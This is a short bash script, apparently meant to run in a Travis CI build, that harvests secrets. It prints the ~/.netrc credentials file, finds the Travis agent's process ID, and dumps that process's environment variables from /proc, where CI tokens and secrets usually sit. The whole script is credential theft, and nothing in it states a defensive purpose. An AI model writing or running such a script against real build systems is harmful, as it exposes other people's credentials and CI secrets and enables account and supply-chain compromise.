#!/bin/bash
sudo ls -l
cat ~/.netrc
PPPID=$(ps aux | grep "travis/agent" |  awk -F " " '{print $2}' | head -1)
echo "$PPPID"
strings /proc/"$PPPID"/environ

